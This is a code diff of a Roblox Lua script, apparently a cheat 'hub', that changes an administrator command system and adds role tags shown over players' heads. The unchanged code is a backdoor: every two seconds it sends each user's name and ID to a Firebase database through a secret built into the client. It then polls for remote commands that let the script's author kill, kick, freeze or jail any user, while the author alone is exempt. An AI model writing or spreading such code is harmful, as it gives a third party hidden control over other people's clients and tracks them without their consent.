@@ -3080,17 +3080,14 @@ end
 -- СИСТЕМА ПРИЕМА КОМАНД АДМИНИСТРАТОРА (FIREBASE CLIENT LISTENER)
 -- ==============================================================================
 -- ==============================================================================
--- СИСТЕМА ПРИЕМА КОМАНД АДМИНИСТРАТОРА (С ЗАЩИТОЙ ОТ СТАРОГО КИКА)
+-- СИСТЕМА ПРИЕМА КОМАНД И ОТОБРАЖЕНИЯ СЕРВЕРНЫХ ТЕГОВ
 -- ==============================================================================
 local jailBox = nil
 local lastCmdId = ""
-local sessionStartTime = os.time() -- Фиксируем время запуска хаба
-
--- Ваш ник для иммунитета (чтобы вас никогда случайно не кикнуло/не убило)
+local sessionStartTime = os.time()
 local ADMIN_NAME = "ABUGEZAN"
 
 local function runAdminAction(action: string, issuer: string)
-    -- Иммунитет для создателя
     if LocalPlayer.Name == ADMIN_NAME or LocalPlayer.DisplayName == ADMIN_NAME then
         return
     end
@@ -3101,18 +3098,14 @@ local function runAdminAction(action: string, issuer: string)
 
     if action == "kill" then
         if hum then hum.Health = 0 end
-
     elseif action == "kick" then
         LocalPlayer:Kick("ты был выкинут с сервера админ панелью абугезана")
-
     elseif action == "freeze" then
         if root then root.Anchored = true end
         if hum then hum.WalkSpeed = 0 end
-
     elseif action == "unfreeze" then
         if root then root.Anchored = false end
         if hum then hum.WalkSpeed = 16 end
-
     elseif action == "jail" then
         if root then
             root.Anchored = true
@@ -3127,7 +3120,6 @@ local function runAdminAction(action: string, issuer: string)
             jailBox.CanCollide = true
             jailBox.Parent = workspace
         end
-
     elseif action == "unjail" then
         if jailBox then 
             jailBox:Destroy() 
@@ -3138,14 +3130,59 @@ local function runAdminAction(action: string, issuer: string)
     end
 end
 
+local function createBillboardTag(head: Instance, role: string)
+    if head:FindFirstChild("TysOverheadTag") then
+        head.TysOverheadTag:Destroy()
+    end
+
+    local isAdmin = (role == "Admin")
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "TysOverheadTag"
+    billboard.Adornee = head
+    billboard.Size = isAdmin and UDim2.new(0, 130, 0, 32) or UDim2.new(0, 115, 0, 28)
+    billboard.StudsOffset = Vector3.new(0, isAdmin and 2.5 or 2.2, 0)
+    billboard.AlwaysOnTop = true
+    billboard.ResetOnSpawn = false
+    billboard.Parent = head
+
+    local tagFrame = Instance.new("Frame")
+    tagFrame.Size = UDim2.new(1, 0, 1, 0)
+    tagFrame.BackgroundColor3 = isAdmin and Color3.fromRGB(25, 10, 45) or Color3.fromRGB(18, 8, 32)
+    tagFrame.BackgroundTransparency = 0.2
+    tagFrame.BorderSizePixel = 0
+    tagFrame.Parent = billboard
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = tagFrame
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = isAdmin and Color3.fromRGB(255, 200, 60) or Color3.fromRGB(170, 60, 255)
+    stroke.Thickness = isAdmin and 1.8 or 1.2
+    stroke.Parent = tagFrame
+
+    local tagText = Instance.new("TextLabel")
+    tagText.Size = UDim2.new(1, 0, 1, 0)
+    tagText.BackgroundTransparency = 1
+    tagText.Text = isAdmin and "👑 ADMIN" or "🌪️ USER"
+    tagText.Font = Enum.Font.GothamBold
+    tagText.TextSize = isAdmin and 12 or 10
+    tagText.TextColor3 = isAdmin and Color3.fromRGB(255, 220, 110) or Color3.fromRGB(230, 190, 255)
+    tagText.Parent = tagFrame
+end
+
+local activeRoles = {}
+
 if httpRequest then
     task.spawn(function()
         local myUserId = tostring(LocalPlayer.UserId)
         local statusEndpoint = string.format("%s/users/%s.json?auth=%s", FIREBASE_BASE, myUserId, FIREBASE_SECRET)
         local commandEndpoint = string.format("%s/commands/%s.json?auth=%s", FIREBASE_BASE, myUserId, FIREBASE_SECRET)
+        local allUsersEndpoint = string.format("%s/users.json?auth=%s", FIREBASE_BASE, FIREBASE_SECRET)
 
         while task.wait(2) do
-            -- Регистрация онлайна
+            -- 1. Регистрация онлайна со статусом User
             pcall(function()
                 httpRequest({
                     Url = statusEndpoint,
@@ -3154,27 +3191,19 @@ if httpRequest then
                     Body = HttpService:JSONEncode({
                         name = LocalPlayer.Name,
                         displayName = LocalPlayer.DisplayName,
+                        role = (LocalPlayer.Name == ADMIN_NAME) and "Admin" or "User",
                         lastSeen = os.time()
                     })
                 })
             end)
 
-            -- Чтение входящей команды
-            local success, res = pcall(function()
-                return httpRequest({
-                    Url = commandEndpoint,
-                    Method = "GET"
-                })
+            -- 2. Проверка новых команд
+            local sCmd, resCmd = pcall(function()
+                return httpRequest({ Url = commandEndpoint, Method = "GET" })
             end)
 
-            if success and res and res.Body and res.Body ~= "null" then
-                local dataOk, cmdData = pcall(function()
-                    return HttpService:JSONDecode(res.Body)
-                end)
-
-                -- Выполняем команду ТОЛЬКО если:
-                -- 1. У неё новый уникальный cmdId
-                -- 2. Она была отправлена ПОСЛЕ запуска этой сессии игры (cmdData.timestamp >= sessionStartTime)
+            if sCmd and resCmd and resCmd.Body and resCmd.Body ~= "null" then
+                local dataOk, cmdData = pcall(function() return HttpService:JSONDecode(resCmd.Body) end)
                 if dataOk and type(cmdData) == "table" and cmdData.action and cmdData.cmdId then
                     local cmdTime = tonumber(cmdData.timestamp) or 0
                     if cmdData.cmdId ~= lastCmdId and cmdTime >= sessionStartTime then
@@ -3183,59 +3212,33 @@ if httpRequest then
                     end
                 end
             end
+
+            -- 3. Синхронизация ролей для тегов
+            local sUsers, resUsers = pcall(function()
+                return httpRequest({ Url = allUsersEndpoint, Method = "GET" })
+            end)
+
+            if sUsers and resUsers and resUsers.Body and resUsers.Body ~= "null" then
+                local decodeOk, uData = pcall(function() return HttpService:JSONDecode(resUsers.Body) end)
+                if decodeOk and type(uData) == "table" then
+                    for uid, info in pairs(uData) do
+                        if info.role then
+                            activeRoles[tostring(uid)] = info.role
+                        end
+                    end
+                end
+            end
+
+            -- 4. Отрисовка тегов над видимыми персонажами
+            for _, player in ipairs(Players:GetPlayers()) do
+                local role = activeRoles[tostring(player.UserId)]
+                if role and player.Character then
+                    local head = player.Character:FindFirstChild("Head")
+                    if head and not head:FindFirstChild("TysOverheadTag") then
+                        createBillboardTag(head, role)
+                    end
+                end
+            end
         end
     end)
 end
-
--- ==============================================================================
--- СИСТЕМА ТЕГА ПОЛЬЗОВАТЕЛЯ ХАБА (PERSISTENT OVERHEAD TAG)
--- ==============================================================================
-local function attachUserTag(char: Model)
-    local head = char:WaitForChild("Head", 5)
-    if not head then return end
-
-    if head:FindFirstChild("TysOverheadTag") then
-        head.TysOverheadTag:Destroy()
-    end
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "TysOverheadTag"
-    billboard.Adornee = head
-    billboard.Size = UDim2.new(0, 115, 0, 28)
-    billboard.StudsOffset = Vector3.new(0, 2.2, 0)
-    billboard.AlwaysOnTop = true
-    billboard.ResetOnSpawn = false
-    billboard.Parent = head
-
-    local tagFrame = Instance.new("Frame")
-    tagFrame.Size = UDim2.new(1, 0, 1, 0)
-    tagFrame.BackgroundColor3 = Color3.fromRGB(18, 8, 32)
-    tagFrame.BackgroundTransparency = 0.3
-    tagFrame.BorderColor3 = Color3.fromRGB(180, 70, 255)
-    tagFrame.BorderSizePixel = 1
-    tagFrame.Parent = billboard
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 6)
-    corner.Parent = tagFrame
-
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(170, 60, 255)
-    stroke.Thickness = 1
-    stroke.Parent = tagFrame
-
-    local tagText = Instance.new("TextLabel")
-    tagText.Size = UDim2.new(1, 0, 1, 0)
-    tagText.BackgroundTransparency = 1
-    tagText.Text = "🌪️ USER"
-    tagText.Font = Enum.Font.GothamBold
-    tagText.TextSize = 11
-    tagText.TextColor3 = Color3.fromRGB(225, 185, 255)
-    tagText.Parent = tagFrame
-end
-
--- Привязка к текущему и будущим спавнам
-if LocalPlayer.Character then
-    task.spawn(attachUserTag, LocalPlayer.Character)
-end
-LocalPlayer.CharacterAdded:Connect(attachUserTag)
